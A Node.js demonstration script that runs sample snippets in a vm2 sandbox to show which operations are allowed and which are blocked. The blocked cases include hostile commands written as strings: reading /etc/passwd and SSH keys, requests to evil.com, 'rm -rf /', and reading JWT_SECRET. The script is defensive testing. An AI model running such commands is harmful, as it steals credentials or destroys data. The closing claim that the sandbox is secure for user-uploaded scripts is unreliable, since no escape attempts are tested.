/**
 * SANDBOX DEMONSTRATION
 * 
 * This script clearly shows what IS and IS NOT blocked in the sandbox.
 * Run with: node sandboxDemo.js
 */

const { VM } = require('vm2');

// Colors
const G = '\x1b[32m';  // Green
const R = '\x1b[31m';  // Red
const Y = '\x1b[33m';  // Yellow
const C = '\x1b[36m';  // Cyan
const B = '\x1b[1m';   // Bold
const X = '\x1b[0m';   // Reset

console.log(`
${C}${B}
╔════════════════════════════════════════════════════════════════════════════════╗
║                                                                                ║
║                     SANDBOX SECURITY DEMONSTRATION                             ║
║                                                                                ║
║  This demo proves that user scripts run in a sandboxed environment where:      ║
║  • File system access is BLOCKED                                               ║
║  • Network access is BLOCKED                                                   ║
║  • Process/system access is BLOCKED                                            ║
║  • Only safe JavaScript operations are ALLOWED                                 ║
║                                                                                ║
╚════════════════════════════════════════════════════════════════════════════════╝
${X}
`);

// Create sandbox
function createSandbox() {
  return new VM({
    timeout: 5000,
    sandbox: {
      console: {
        log: (...args) => console.log('   [Script Output]:', ...args),
      },
      JSON, Math, Date, Array, Object, String, Number, Boolean, RegExp, Map, Set, Promise,
      // All dangerous things are undefined
      process: undefined,
      require: undefined,
      global: undefined,
      Buffer: undefined,
      eval: undefined,
      Function: undefined,
    },
    eval: false,
    wasm: false,
    require: { external: false, builtin: [], root: [], mock: {} },
  });
}

function runDemo(title, script, expectSuccess) {
  console.log(`\n${Y}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${X}`);
  console.log(`${B}Test: ${title}${X}`);
  console.log(`${Y}Script:${X} ${script.substring(0, 70)}...`);
  
  try {
    const vm = createSandbox();
    // Wrap in IIFE to allow return statements
    const wrappedScript = `(function() { ${script} })()`;
    const result = vm.run(wrappedScript);
    
    if (expectSuccess) {
      console.log(`${G}✅ SUCCESS${X} - Script executed safely`);
      if (result !== undefined) {
        console.log(`   Result: ${JSON.stringify(result)}`);
      }
    } else {
      console.log(`${R}⚠️ UNEXPECTED SUCCESS${X} - This should have been blocked!`);
    }
  } catch (error) {
    if (!expectSuccess) {
      console.log(`${G}✅ BLOCKED${X} - "${error.message}"`);
    } else {
      console.log(`${R}❌ UNEXPECTED ERROR${X} - ${error.message}`);
    }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1: ALLOWED OPERATIONS
// ═══════════════════════════════════════════════════════════════════════════════

console.log(`\n${C}${B}
╔══════════════════════════════════════════════════════════════════════════════╗
║  SECTION 1: ALLOWED OPERATIONS - These SHOULD work                           ║
╚══════════════════════════════════════════════════════════════════════════════╝${X}`);

runDemo(
  'Basic Math',
  'return 1 + 2 + 3;',
  true
);

runDemo(
  'Array Operations',
  'return [1,2,3,4,5].filter(x => x > 2).map(x => x * 2);',
  true
);

runDemo(
  'JSON Operations',
  'return JSON.parse(JSON.stringify({name: "test", value: 42}));',
  true
);

runDemo(
  'Console Output',
  'console.log("Hello from sandbox!"); return "done";',
  true
);

runDemo(
  'Date Operations',
  'return new Date().getFullYear();',
  true
);

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 2: BLOCKED - FILE SYSTEM
// ═══════════════════════════════════════════════════════════════════════════════

console.log(`\n${C}${B}
╔══════════════════════════════════════════════════════════════════════════════╗
║  SECTION 2: FILE SYSTEM ACCESS - These SHOULD be blocked                     ║
╚══════════════════════════════════════════════════════════════════════════════╝${X}`);

runDemo(
  'Read /etc/passwd',
  'const fs = require("fs"); return fs.readFileSync("/etc/passwd", "utf8");',
  false
);

runDemo(
  'Read SSH Keys',
  'const fs = require("fs"); return fs.readFileSync("/root/.ssh/id_rsa");',
  false
);

runDemo(
  'Write File',
  'const fs = require("fs"); fs.writeFileSync("/tmp/evil", "hacked");',
  false
);

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 3: BLOCKED - NETWORK
// ═══════════════════════════════════════════════════════════════════════════════

console.log(`\n${C}${B}
╔══════════════════════════════════════════════════════════════════════════════╗
║  SECTION 3: NETWORK ACCESS - These SHOULD be blocked                         ║
╚══════════════════════════════════════════════════════════════════════════════╝${X}`);

runDemo(
  'HTTP Request',
  'const http = require("http"); http.get("http://evil.com/steal");',
  false
);

runDemo(
  'HTTPS Request',
  'const https = require("https"); https.get("https://evil.com/data");',
  false
);

runDemo(
  'TCP Connection',
  'const net = require("net"); net.connect(80, "evil.com");',
  false
);

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 4: BLOCKED - PROCESS/SYSTEM
// ═══════════════════════════════════════════════════════════════════════════════

console.log(`\n${C}${B}
╔══════════════════════════════════════════════════════════════════════════════╗
║  SECTION 4: PROCESS/SYSTEM ACCESS - These SHOULD be blocked                  ║
╚══════════════════════════════════════════════════════════════════════════════╝${X}`);

runDemo(
  'Execute Shell Command',
  'const {exec} = require("child_process"); exec("rm -rf /");',
  false
);

runDemo(
  'Spawn Process',
  'const {spawn} = require("child_process"); spawn("bash", ["-c", "cat /etc/passwd"]);',
  false
);

runDemo(
  'Access Environment Variables',
  'return process.env.JWT_SECRET;',
  false
);

runDemo(
  'Exit Process',
  'process.exit(1);',
  false
);

runDemo(
  'Get OS Info',
  'const os = require("os"); return os.homedir();',
  false
);

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 5: BLOCKED - CODE EXECUTION
// ═══════════════════════════════════════════════════════════════════════════════

console.log(`\n${C}${B}
╔══════════════════════════════════════════════════════════════════════════════╗
║  SECTION 5: DYNAMIC CODE EXECUTION - These SHOULD be blocked                 ║
╚══════════════════════════════════════════════════════════════════════════════╝${X}`);

runDemo(
  'eval()',
  'return eval("1 + 1");',
  false
);

runDemo(
  'new Function()',
  'const fn = new Function("return process.env"); return fn();',
  false
);

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 6: TIMEOUT TEST
// ═══════════════════════════════════════════════════════════════════════════════

console.log(`\n${C}${B}
╔══════════════════════════════════════════════════════════════════════════════╗
║  SECTION 6: TIMEOUT ENFORCEMENT - Infinite loops SHOULD be stopped           ║
╚══════════════════════════════════════════════════════════════════════════════╝${X}`);

runDemo(
  'Infinite Loop (will timeout)',
  'while(true) { /* infinite loop */ }',
  false
);

// ═══════════════════════════════════════════════════════════════════════════════
// SUMMARY
// ═══════════════════════════════════════════════════════════════════════════════

console.log(`\n${C}${B}
╔══════════════════════════════════════════════════════════════════════════════╗
║                              SUMMARY                                         ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  ${G}✅ ALLOWED:${X}${C}${B}                                                            ║
║     • Basic JavaScript (arrays, objects, strings, math)                      ║
║     • JSON parsing/stringifying                                              ║
║     • Date operations                                                        ║
║     • Console output (captured)                                              ║
║     • Database operations (via injected db object)                           ║
║                                                                              ║
║  ${R}❌ BLOCKED:${X}${C}${B}                                                            ║
║     • require('fs') - File system access                                     ║
║     • require('http/https/net') - Network access                             ║
║     • require('child_process') - Shell commands                              ║
║     • process.env - Environment variables                                    ║
║     • process.exit() - Process control                                       ║
║     • eval() / new Function() - Dynamic code execution                       ║
║     • Infinite loops - Timeout after 5 seconds                               ║
║                                                                              ║
║  ${Y}⚠️ The sandbox is SECURE for running user-uploaded scripts!${X}${C}${B}               ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
${X}
`);